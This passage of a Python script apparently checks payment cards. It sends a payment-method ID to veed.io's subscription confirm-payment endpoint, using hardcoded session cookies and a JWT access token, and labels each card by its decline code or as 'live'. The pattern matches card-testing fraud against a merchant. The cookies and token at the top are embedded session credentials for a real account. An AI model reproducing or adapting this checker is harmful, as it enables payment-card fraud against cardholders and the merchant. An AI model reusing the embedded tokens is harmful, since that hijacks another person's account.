user_meta=eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; www_veed_io_access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0.FNJO9kK4d8CRhaGWAgpkATJ3QoEX06DKeVb17LsVvsq5z_TZ5u-N4CdeBUwJ8I1031zSxn5jlJu2v_wCF_0OSuC9yfkFHaKnhZvxPbHmmGV1vYnWo9iOiEX-_bi4giilsIvK45Fq6gsElgfV-Z0ZTCIONROWeB5brus6i73lQTUoqJH7cJ_QAjlUMSE0h2qCnnAKwNW42W4bixDHcgDvSal3o1d9p7Cg50iN79lmPVBQHDFYPzl6ovx61eGDkAto-sKU8oAMdT6fbur__kNgC0RSsKqtVi7WNLqMyqpTQgvxHrvvHIszvliHjp66OALBXLSCWsjcu4Sxi8RenHSbZ2oJGo0rhpnk31GpDK5jwYPzF0rGhNyAx-zqA-Z8zDqY1fjXbgK8I6kdZKOBtyE_xLf-TKYRbOI-l-HdEjeIesLml3iNmkg8-G1gBobW4YjmqyLM1rzxLBcxGiyhHMPiAxRS37IKM0cVC4zVGdiM_tmN5bdZRw9jjDABHFqQ6PZJ1QxDfW2PNEnp3lVXXat_drN6FOiLjh1dJWxKNQMfE_OPcrGdbBgT6tyJnHRhsFlG_b_-BmiTw9-J8P50JAiJJHQliHcccLel1GLZAEu_4SkZiFlmxvxUSMs1N8uFNKMbzsVPgvXKBHncH2fiLtsJAlOYm_n-CzwNlmqr7tjRbiY; ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%224b539700-4722-1d5e-a023-f358c7475640%22%2C%22c%22%3A1720168611936%2C%22l%22%3A1720202374527%7D; ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22fb09e1b1-3049-4cb0-a830-b82b196da5b0%22%2C%22c%22%3A1720168611914%2C%22l%22%3A1720202374533%7D; _gcl_gs=2.1.k1$i1720202372; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Jul+05+2024+20%3A59%3A35+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d9c7c548-1e38-4476-afa1-5630669645f6&interactionCount=0&isAnonUser=1&landingPath=NotLandingPage&AwaitingReconsent=false&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1; _gcl_aw=GCL.1720202378.Cj0KCQjws560BhCuARIsAHMqE0Gv6fX6MGgEAR9tPxNUD7km8cFg7IMGZWqKUATKBOsbCNDekRiGA6QaApbnEALw_wcB; ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%2274adaec0-670a-3829-f94f-dfd5ce4554a0%22%2C%22e%22%3A1720204177697%2C%22c%22%3A1720202374520%2C%22l%22%3A1720202377697%7D; _gcl_au=1.1.1518723751.1720168590.1135269138.1720202377.1720202377; __stripe_sid=9c542508-2173-4bae-b35e-a99f7bc20b249f62df; _uetsid=aa6f45003aa911efbea679c2cc7fd749; _uetvid=aa6fdfa03aa911ef8187f57353e833fe; _ga_MDGG251D9T=GS1.1.1720202374.3.1.1720202445.60.0.0; intercom-session-j76wdp4u=VjZHcDMzK0FUSFkyWnRpNE5JWWl2dEpSNEU3ZXZFR2E3UWo0S0dQRWFRVGpmd3lIdDU0aVg0NDI1Z2J2UkpOcy0tUVdac3dpQmh2TEttNVlyRHlaTmlVZz09--bc111a1532eb51d05c6ed5bf9e9185765bcf96df; AMP_47f1934446=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJlMWY0M2ZkYi0zM2FmLTRjY2YtOGVmZC1iODBjMzc2MDE2YzElMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJmYjA5ZTFiMS0zMDQ5LTRjYjAtYTgzMC1iODJiMTk2ZGE1YjAlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzIwMjAyMzczNzUyJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyMDIwMjQ2NjA4NyUyQyUyMmxhc3RFdmVudElkJTIyJTNBMzclN0Q=',
	    'origin': 'https://www.veed.io',
	    'referer': 'https://www.veed.io/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'processorPaymentMethodId': id,
	}
	
	response = requests.post(
	    f'https://www.veed.io/api/v1/subscriptions/{ids}/confirm-payment',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	try:
		ii=(response.json()['errors'][0]['declineCode'])
		return ii
	except:
		print(response.json())
		return 'live'
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"processorPaymentMethodId":"pm_1PZGRSJqE5f9ucQhYwJapd0Y"}'
	#response = requests.post(
	#    'https://www.veed.io/api/v1/subscriptions/4156491f-8ec3-4d9f-a9a6-cd6c2ef70552/confirm-payment',
	#    cookies=cookies,
	#    headers=headers,
	#    data=data,
	#)